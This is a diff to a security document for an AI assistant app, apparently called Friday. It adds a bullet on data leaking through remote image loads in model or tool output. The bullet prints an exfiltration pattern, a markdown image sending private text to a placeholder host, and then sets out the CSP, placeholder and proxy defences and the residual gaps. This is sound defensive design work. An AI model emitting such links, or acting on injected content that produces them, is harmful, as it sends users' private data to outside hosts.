@@ -355,6 +355,19 @@ in `core.check_auth` before loopback trust):
   `/api/creations/*` as a script or style, so it can run a creation's JavaScript
   in its own origin and read any owner data that script embeds, given the
   creation's id. Do not embed owner data or secrets in a creation's files.
+- **Remote loads from model or tool output.** A reply, a fetched page or a tool
+  result that embeds `![](https://host/?d=<private text>)` would make the browser
+  send that text to the host with no gate in the way. Friday's page loads no
+  remote image, media, font or connection: the renderer turns a remote image
+  (markdown, HTML, reference link, `//host`, `srcset`, CSS `url()` and
+  `image-set()`) into a click-to-load placeholder that names the host, the page
+  CSP allows `img-src`, `media-src` and `connect-src` only to Friday's own origin
+  (plus the one CDN hand tracking compiles from), and sandboxed documents get an
+  `img-src` with no remote host and `connect-src 'none'`. A click loads the
+  picture through `/api/remote-image`, which fetches behind the SSRF guard and
+  returns raster bytes only, so the owner's click is the only thing that ever
+  sends the address out. Residual: a sandboxed generated page can still open a
+  pop-up or embed a frame to a remote address, and PDFs carry no CSP.
 
 ---
 
